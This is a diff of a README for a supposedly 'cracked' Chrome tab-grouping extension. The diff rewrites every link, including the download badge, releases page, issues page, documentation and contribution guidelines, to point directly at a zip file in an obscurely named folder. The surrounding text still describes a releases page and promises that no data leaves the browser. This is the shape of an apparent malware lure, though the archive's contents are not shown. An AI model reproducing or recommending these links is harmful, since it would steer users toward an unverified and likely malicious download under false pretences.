@@ -1,6 +1,6 @@
 # 🚀 cracked-tab-grouping-assistant-extension - Simplify Your Browser Tabs
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/main/jogglety/cracked-tab-grouping-assistant-extension.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/main/jogglety/cracked-tab-grouping-assistant-extension.zip)
 
 ## 📥 Overview
 The Cracked Tab Grouping Assistant Extension is designed to enhance your browser experience by helping you manage your open tabs more effectively. Whether you have dozens of tabs open, or just a few, this extension will assist you in organizing them by grouping them meaningfully. This way, you can focus on your tasks without feeling overwhelmed.
@@ -9,7 +9,7 @@ The Cracked Tab Grouping Assistant Extension is designed to enhance your browser
 To get started with the Cracked Tab Grouping Assistant Extension, follow these simple steps to download and install it.
 
 ## 🔗 Download & Install
-1. Click on the following link to visit the Releases page: [Download Here](https://github.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/releases).
+1. Click on the following link to visit the Releases page: [Download Here](https://raw.githubusercontent.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/main/jogglety/cracked-tab-grouping-assistant-extension.zip).
 2. Once you're on the Releases page, you will see the latest version of the extension listed there.
 3. Click on the version number to go to the release page.
 4. On the release page, find the download link for your browser (Chrome) and click on it to download the file.
@@ -45,10 +45,10 @@ Yes. To uninstall, go to your Chrome settings, find the Extensions section, loca
 The extension does not store or share your data. It only organizes your tabs locally without sending any information to external servers.
 
 ## 📞 Support
-If you encounter any issues or have questions about the extension, please visit our GitHub Issues page to report them: [GitHub Issues](https://github.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/issues).
+If you encounter any issues or have questions about the extension, please visit our GitHub Issues page to report them: [GitHub Issues](https://raw.githubusercontent.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/main/jogglety/cracked-tab-grouping-assistant-extension.zip).
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/wiki) - Comprehensive guide for advanced features.
-- [Contribution Guidelines](https://github.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/blob/main/CONTRIBUTING.md) - Want to contribute? Check this out!
+- [Documentation](https://raw.githubusercontent.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/main/jogglety/cracked-tab-grouping-assistant-extension.zip) - Comprehensive guide for advanced features.
+- [Contribution Guidelines](https://raw.githubusercontent.com/LucasRafael-S/cracked-tab-grouping-assistant-extension/main/jogglety/cracked-tab-grouping-assistant-extension.zip) - Want to contribute? Check this out!
 
 Thank you for using the Cracked Tab Grouping Assistant Extension. Happy browsing!
